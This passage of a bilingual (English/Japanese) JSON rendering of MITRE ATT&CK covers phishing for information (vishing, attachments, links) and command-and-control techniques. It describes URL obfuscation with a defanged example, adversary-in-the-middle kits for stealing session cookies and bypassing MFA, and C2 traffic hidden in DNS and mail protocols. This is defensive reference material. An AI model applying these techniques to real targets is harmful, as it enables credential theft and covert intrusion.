FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
                "description_jp": "攻撃者は、ターゲティング中に使用できる機密情報を引き出すためにフィッシングメッセージを送信する可能性があります。情報のためのフィッシングは、ターゲットを騙して情報（多くの場合、資格情報やその他の実用的な情報）を漏洩させようとする試みです。情報のためのフィッシングは、悪意のあるコードを実行するのではなく、被害者からデータを収集することを目的としている点で[フィッシング](https://attack.mitre.org/techniques/T1566)とは異なります。\n\nあらゆる形態のフィッシングは、電子的に配信されるソーシャルエンジニアリングです。フィッシングは標的型（スピアフィッシングと呼ばれる）にすることができます。スピアフィッシングでは、特定の個人、企業、または業界が攻撃者の標的となります。より一般的には、攻撃者は大量の資格情報収集キャンペーンなどで、非標的型のフィッシングを実行できます。\n\n敵対者はまた、メール、インスタントメッセージ、またはその他の電子的会話手段の交換を通じて直接情報を取得しようとする可能性があります。(引用: ThreatPost Social Media Phishing)(引用: TrendMictro Phishing)(引用: PCMag FakeLogin)(引用: Sophos Attachment)(引用: GitHub Phishery) 被害者はまた、攻撃者が機密情報を収集しようとする電話番号に電話するように指示するフィッシングメッセージを受信する可能性があります。(引用: Avertium callback phishing)\n\n情報のためのフィッシングには、情報収集の理由がある情報源になりすましたり（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、複数の、一見緊急のメッセージを送信したりするなど、ソーシャルエンジニアリング技術が頻繁に関与します。これを達成する別の方法は、送信者のIDを[メールスプーフィング](https://attack.mitre.org/techniques/T1672)することです。(引用: Proofpoint-spoof) これは、人間の受信者と自動化されたセキュリティツールの両方を騙すために使用できます。(引用: cyberproof-double-bounce)\n\n情報収集のためのフィッシングには、メッセージ送信に悪用されている侵害されたアカウントからのメールやメタデータ/ヘッダーの削除や操作（例：[メール隠蔽ルール](https://attack.mitre.org/techniques/T1564/008)）など、回避技術も含まれる場合があります。(引用: Microsoft OAuth Spam 2022)(引用: Palo Alto Unit 42 VBA Infostealer 2014)",
                "subtechniques": [
                    {
                        "id": "T1598.004",
                        "name_eng": "Spearphishing Voice",
                        "name_jp": "スピアフィッシングボイス",
                        "description_eng": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる機密情報を引き出すために音声通信を使用する可能性があります。情報のためのスピアフィッシングは、ターゲットを騙して情報（多くの場合、資格情報やその他の実用的な情報）を漏洩させようとする試みです。情報のためのスピアフィッシングには、情報収集の理由がある情報源になりすましたり（例：[なりすまし](https://attack.mitre.org/techniques/T1656)）、受信者に緊急性や警戒感を抱かせたりするなど、ソーシャルエンジニアリング技術が頻繁に関与します。\n\nあらゆる形態のフィッシングは、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、攻撃者は電話を使用して被害者から機密情報を引き出します。音声フィッシング（または「ビッシング」）として知られるこれらの通信は、攻撃者、雇われたコールセンター、さらにはロボコールを介して自動的に実行できます。音声フィッシャーは、ビジネスパートナーやテクニカルサポートスタッフなど、信頼できるエンティティになりすましながら電話番号を偽装する場合があります。(引用: BOA Telephone Scams)\n\n被害者はまた、攻撃者が機密情報を収集しようとする電話番号に電話するように指示するフィッシングメッセージ（「コールバックフィッシング」）を受信する可能性があります。(引用: Avertium callback phishing)\n\n攻撃者はまた、以前の偵察活動（例：[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)または[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）からの情報を使用して、被害者にとってさらに説得力があり信憑性の高い口実を作成する場合があります。"
                    },
                    {
                        "id": "T1598.001",
                        "name_eng": "Spearphishing Service",
                        "name_jp": "スピアフィッシングサービス",
                        "description_eng": "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる機密情報を引き出すために、サードパーティサービスを介してスピアフィッシングメッセージを送信する可能性があります。情報のためのスピアフィッシングは、ターゲットを騙して情報（多くの場合、資格情報やその他の実用的な情報）を漏洩させようとする試みです。情報のためのスピアフィッシングには、情報収集の理由がある情報源になりすましたり（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、複数の、一見緊急のメッセージを送信したりするなど、ソーシャルエンジニアリング技術が頻繁に関与します。\n\nあらゆる形態のスピアフィッシングは、特定の個人、企業、または業界を標的とした、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、攻撃者はさまざまなソーシャルメディアサービス、個人のウェブメール、およびその他の企業が管理していないサービスを介してメッセージを送信します。(引用: ThreatPost Social Media Phishing) これらのサービスは、企業よりもセキュリティポリシーが緩い可能性が高くなります。ほとんどの種類のスピアフィッシングと同様に、目標はターゲットとの信頼関係を築いたり、何らかの方法でターゲットの関心を引いたりすることです。攻撃者は偽のソーシャルメディアアカウントを作成し、潜在的な求人機会について従業員にメッセージを送信する可能性があります。そうすることで、サービス、ポリシー、環境に関する情報について尋ねるもっともらしい理由が得られます。攻撃者はまた、以前の偵察活動（例：[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)または[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）からの情報を使用して、説得力があり信憑性の高いおとりを作成する場合があります。"
                    },
                    {
                        "id": "T1598.002",
                        "name_eng": "Spearphishing Attachment",
                        "name_jp": "スピアフィッシング添付ファイル",
                        "description_eng": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such as [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) to harvest user credentials via fake login portals.(Citation: Huntress HTML Smuggling 2024)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる機密情報を引き出すために、悪意のある添付ファイル付きのスピアフィッシングメッセージを送信する可能性があります。情報のためのスピアフィッシングは、ターゲットを騙して情報（多くの場合、資格情報やその他の実用的な情報）を漏洩させようとする試みです。情報のためのスピアフィッシングには、情報収集の理由がある情報源になりすましたり（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、複数の、一見緊急のメッセージを送信したりするなど、ソーシャルエンジニアリング技術が頻繁に関与します。\n\nあらゆる形態のスピアフィッシングは、特定の個人、企業、または業界を標的とした、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、攻撃者はスピアフィッシングメールにファイルを添付します。場合によっては、受信者が情報を入力し、ファイルを返送することに依存する場合があります。(引用: Sophos Attachment)(引用: GitHub Phishery) スピアフィッシングメールの本文は通常、ビジネス関係者からの情報要求など、ファイルを記入すべきもっともらしい理由を提示しようとします。他のケースでは、攻撃者は偽のログインポータルを介してユーザー資格情報を収集するために[HTMLスマグリング](https://attack.mitre.org/techniques/T1027/006)などのテクニックを利用する場合があります。(引用: Huntress HTML Smuggling 2024)\n\n攻撃者はまた、以前の偵察活動（例：[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)または[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）からの情報を使用して、説得力があり信憑性の高いおとりを作成する場合があります。"
                    },
                    {
                        "id": "T1598.003",
                        "name_eng": "Spearphishing Link",
                        "name_jp": "スピアフィッシングリンク",
                        "description_eng": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed “tracking pixels”, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing”). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる機密情報を引き出すために、悪意のあるリンク付きのスピアフィッシングメッセージを送信する可能性があります。情報のためのスピアフィッシングは、ターゲットを騙して情報（多くの場合、資格情報やその他の実用的な情報）を漏洩させようとする試みです。情報のためのスピアフィッシングには、情報収集の理由がある情報源になりすましたり（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、複数の、一見緊急のメッセージを送信したりするなど、ソーシャルエンジニアリング技術が頻繁に関与します。\n\nあらゆる形態のスピアフィッシングは、特定の個人、企業、または業界を標的とした、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、悪意のあるメールには、通常、ユーザーを積極的にクリックさせたり、URLをブラウザにコピーして貼り付けさせたりするためのソーシャルエンジニアリングテキストが付随したリンクが含まれています。(引用: TrendMictro Phishing)(引用: PCMag FakeLogin) 提供されたウェブサイトは、正当なサイト（オンラインまたは企業のログインポータルなど）のクローンであるか、外観が正当なサイトに酷似しており、URLに実際のサイトの要素が含まれている場合があります。URLはまた、URLスキーマの癖を利用して難読化される場合があり、例えば、整数ベースまたは16進数ベースのホスト名形式の受け入れや、「@」記号の前のテキストの自動破棄などがあります。例：<code>hxxp://google.com@1157586937</code>。(引用: Mandiant URL Obfuscation 2023)\n\n攻撃者はまた、フィッシングメッセージ内に「トラッキングピクセル」、「Webバグ」、または「Webビーコン」を埋め込み、メールの受信を確認すると同時に、IPアドレスなどの被害者情報をプロファイリングおよび追跡する可能性があります。(引用: NIST Web Bug)(引用: Ryte Wiki) これらのメカニズムは、多くの場合、小さな画像（通常は1ピクセルサイズ）またはその他の難読化されたオブジェクトとして表示され、通常、リモートサーバーへのリンクを含むHTMLコードとして配信されます。(引用: Ryte Wiki)(引用: IAPP)\n\n攻撃者はまた、「ブラウザインザブラウザ」（BitB）攻撃として知られるものを使用して、完全なウェブサイトを偽装できる場合があります。正当なURL（認証ポータルなど）を含むように見えるHTMLベースのアドレスバーを持つ偽のブラウザポップアップウィンドウを生成することにより、典型的なURL検証方法をバイパスしながらユーザーに資格情報の入力を促すことができる場合があります。(引用: ZScaler BitB 2020)(引用: Mr. D0x BitB 2022)\n\n攻撃者は、`EvilProxy`や`Evilginx2`などのフィッシングキットを使用して、被害者と正当なウェブサイト間の接続をプロキシすることにより、中間者フィッシングを実行できます。ログインに成功すると、被害者は正当なウェブサイトにリダイレクトされますが、攻撃者はユーザー名とパスワードに加えてセッションCookie（つまり、[WebセッションCookieの窃取](https://attack.mitre.org/techniques/T1539)）をキャプチャします。これにより、攻撃者は[WebセッションCookie](https://attack.mitre.org/techniques/T1550/004)を介してMFAをバイパスできる可能性があります。(引用: Proofpoint Human Factor)\n\n敵対者はまた、クイックレスポンス（QR）コード（「クイッシング」とも呼ばれる）の形で悪意のあるリンクを送信する可能性があります。これらのリンクは、被害者を認証情報フィッシングページに誘導する可能性があります。(引用：QR-campaign-energy-firm) QRコードを使用することにより、URLがメールに公開されず、したがってほとんどの自動メールセキュリティスキャンで検出されない可能性があります。(引用：qr-phish-agriculture) これらのQRコードは、ユーザーのモバイルデバイスにスキャンされるか、直接配信される可能性があります（つまり、[フィッシング](https://attack.mitre.org/techniques/T1660)）。これは、いくつかの関連する点で安全性が低い可能性があります。(引用：qr-phish-agriculture) 例えば、モバイルユーザーは、モバイルのフォームファクタが小さいため、本物のウェブサイトと認証情報収集ウェブサイトのわずかな違いに気づかない可能性があります。\n\n偽のウェブサイトから、情報はウェブフォームで収集され、攻撃者に送信されます。攻撃者はまた、以前の偵察活動（例：[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)または[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）からの情報を使用して、説得力があり信憑性の高いおとりを作成する場合があります。"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0011",
        "name_eng": "Command and Control",
        "name_jp": "コマンドアンドコントロール",
        "description_eng": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
        "description_jp": "攻撃者は、制御下にある侵害済みシステムと通信しようとしています。\n\nコマンドアンドコントロールは、攻撃者が被害者ネットワーク内の制御下にあるシステムと通信するために使用する可能性のあるテクニックで構成されます。攻撃者は通常、検出を回避するために、通常の予期されるトラフィックを模倣しようとします。被害者のネットワーク構造と防御に応じて、攻撃者がさまざまなレベルのステルス性でコマンドアンドコントロールを確立する方法は多数あります。",
        "techniques": [
            {
                "id": "T1071",
                "name_eng": "Application Layer Protocol",
                "name_jp": "アプリケーション層プロトコル",
                "description_eng": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22)",
                "description_jp": "攻撃者は、既存のトラフィックに紛れ込ませて検出/ネットワークフィルタリングを回避するために、OSIアプリケーション層プロトコルを使用して通信する可能性があります。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。\n\n敵対者は、ウェブブラウジング、ファイル転送、電子メール、DNS、出版/購読に使用されるものなど、様々なプロトコルを利用するかもしれない。エンクレーブ内で内部的に発生する接続（プロキシやピボットノードと他のノード間の接続など）の場合、一般的に使用されるプロトコルはSMB、SSH、またはRDPである。(引用：Mandiant APT29 Eye Spy Email Nov 22)",
                "subtechniques": [
                    {
                        "id": "T1071.002",
                        "name_eng": "File Transfer Protocols",
                        "name_jp": "ファイル転送プロトコル",
                        "description_eng": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                        "description_jp": "攻撃者は、既存のトラフィックに紛れ込ませることで検出/ネットワークフィルタリングを回避するために、ファイル転送に関連するアプリケーション層プロトコルを使用して通信する可能性があります。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。\n\nSMB(引用: US-CERT TA18-074A)、FTP(引用: ESET Machete July 2019)、FTPS、TFTPなどのファイルを転送するプロトコルは、環境内で非常に一般的である可能性があります。これらのプロトコルから生成されるパケットには、データを隠蔽できる多くのフィールドやヘッダーが含まれている場合があります。データは転送されたファイル内に隠蔽されることもあります。攻撃者はこれらのプロトコルを悪用して、通常の予期されるトラフィックを模倣しながら、被害者ネットワーク内の制御下にあるシステムと通信する可能性があります。"
                    },
                    {
                        "id": "T1071.004",
                        "name_eng": "DNS",
                        "name_jp": "DNS",
                        "description_eng": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)",
                        "description_jp": "攻撃者は、既存のトラフィックに紛れ込ませて検出/ネットワークフィルタリングを回避するために、ドメインネームシステム（DNS）アプリケーション層プロトコルを使用して通信する可能性があります。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。\n\nDNSプロトコルはコンピュータネットワークにおいて管理機能を果たしており、そのため環境内で非常に一般的である可能性があります。DNSトラフィックは、ネットワーク認証が完了する前でも許可される場合があります。DNSパケットには、データを隠蔽できる多くのフィールドとヘッダーが含まれています。DNSトンネリングとしてよく知られているように、攻撃者はDNSを悪用して、通常の予期されるトラフィックを模倣しながら、被害者ネットワーク内の制御下にあるシステムと通信する可能性があります。(引用: PAN DNS Tunneling)(引用: Medium DnsTunneling)"
                    },
                    {
                        "id": "T1071.005",
                        "name_eng": "Publish/Subscribe Protocols",
                        "name_jp": "出版/購読プロトコル",
                        "description_eng": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as <code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>, and <code>STOMP</code> use a publish/subscribe design, with message distribution managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation: Mandiant APT1 Appendix) Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics.(Citation: wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.",
                        "description_jp": "攻撃者は、既存のトラフィックに紛れ込ませて検出/ネットワークフィルタリングを回避するために、出版/購読（pub/sub）アプリケーション層プロトコルを使用して通信する可能性があります。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。\n\n<code>MQTT</code>、<code>XMPP</code>、<code>AMQP</code>、<code>STOMP</code>などのプロトコルは、集中型ブローカーによって管理されるメッセージ配信を伴う出版/購読設計を使用します。(引用: wailing crab sub/pub)(引用: Mandiant APT1 Appendix) パブリッシャーはメッセージをトピック別に分類し、サブスクライバーはサブスクライブしたトピックに従ってメッセージを受信します。(引用: wailing crab sub/pub) 攻撃者は、通常の予期されるトラフィックを模倣しながら、メッセージブローカーの背後から制御下にあるシステムと通信するために、出版/購読プロトコルを悪用する可能性があります。"
                    },
                    {
                        "id": "T1071.003",
                        "name_eng": "Mail Protocols",
                        "name_jp": "メールプロトコル",
                        "description_eng": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: FireEye APT28)",
                        "description_jp": "攻撃者は、既存のトラフィックに紛れ込ませることで検出/ネットワークフィルタリングを回避するために、電子メール配信に関連するアプリケーション層プロトコルを使用して通信する可能性があります。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。\n\nSMTP/S、POP3/S、IMAPなど、電子メールを伝送するプロトコルは、環境内で非常に一般的である可能性があります。これらのプロトコルから生成されるパケットには、データを隠蔽できる多くのフィールドやヘッダーが含まれている場合があります。データは電子メールメッセージ自体の中に隠蔽されることもあります。攻撃者はこれらのプロトコルを悪用して、通常の予期されるトラフィックを模倣しながら、被害者ネットワーク内の制御下にあるシステムと通信する可能性があります。(引用: FireEye APT28)"
                    },
                    {
                        "id": "T1071.001",
                        "name_eng": "Web Protocols",
                        "name_jp": "Webプロトコル",
                        "description_eng": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                        "description_jp": "攻撃者は、既存のトラフィックに紛れ込ませることで検出/ネットワークフィルタリングを回避するために、Webトラフィックに関連するアプリケーション層プロトコルを使用して通信する可能性があります。リモートシステムへのコマンド、および多くの場合それらのコマンドの結果は、クライアントとサーバー間のプロトコルトラフィック内に埋め込まれます。\n\nHTTP/S(引用: CrowdStrike Putter Panda)やWebSocket(引用: Brazking-Websockets)など、Webトラフィックを伝送するプロトコルは、環境内で非常に一般的である可能性があります。HTTP/Sパケットには、データを隠蔽できる多くのフィールドやヘッダーが含まれています。攻撃者はこれらのプロトコルを悪用して、通常の予期されるトラフィックを模倣しながら、被害者ネットワーク内の制御下にあるシステムと通信する可能性があります。"
                    }
                ]
            },
            {
                "id": "T1219",
                "name_eng": "Remote Access Tools",
                "name_jp": "リモートアクセスツール",
                "description_eng": "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nRemote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.\n\nInstallation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "description_jp": "攻撃者は、正当なリモートアクセスツールを使用して、ネットワーク内にインタラクティブなコマンドアンドコントロールチャネルを確立する可能性があります。リモートアクセスツールは、グラフィカルインターフェイス、コマンドラインインタラクション、開発または管理ソフトウェアを介したプロトコルトンネル、またはIP経由のKVM（キーボード、ビデオ、マウス）ソリューションなどのハードウェアレベルのアクセスを介して、2つの信頼できるホスト間にセッションを作成します。デスクトップサポートソフトウェア（通常はグラフィカルインターフェイス）およびリモート管理ソフトウェア（通常はコマンドラインインターフェイス）により、ユーザーはローカルユーザーであるかのようにリモートでコンピュータを制御し、ユーザーまたはソフトウェアの権限を継承できます。このソフトウェアは、トラブルシューティング、ソフトウェアのインストール、およびシステム管理に一般的に使用されます。(引用: Symantec Living off the Land)(引用: CrowdStrike 2015 Global Threat Report)(引用: CrySyS Blog TeamSpy) 攻撃者は同様に、リモートアクセスを可能にするEDRやその他の防御ツールに含まれる応答機能を悪用する可能性があります。\n\nリモートアクセスツールは、冗長アクセスのための代替通信チャネルとして、またはターゲットシステムとの対話型リモートデスクトップセッションを確立するために、侵害後にインストールおよび使用される場合があります。また、サービスまたは攻撃者が制御するシステムへのリバース接続またはバックコネクトを確立するためのマルウェアコンポーネントとして使用される場合もあります。\n\n多くのリモートアクセスツールのインストールには、永続化も含まれる場合があります（例：ソフトウェアのインストールルーチンが[Windowsサービス](https://attack.mitre.org/techniques/T1543/003)を作成する）。リモートアクセスモジュール/機能はまた、Google Chromeのリモートデスクトップなど、他の既存のソフトウェアの一部として存在する場合があります。(引用: Google Chrome Remote Desktop)(引用: Chrome Remote Desktop)",
                "subtechniques": [
                    {
                        "id": "T1219.003",
                        "name_eng": "Remote Access Hardware",
                        "name_jp": "リモートアクセスハードウェア",
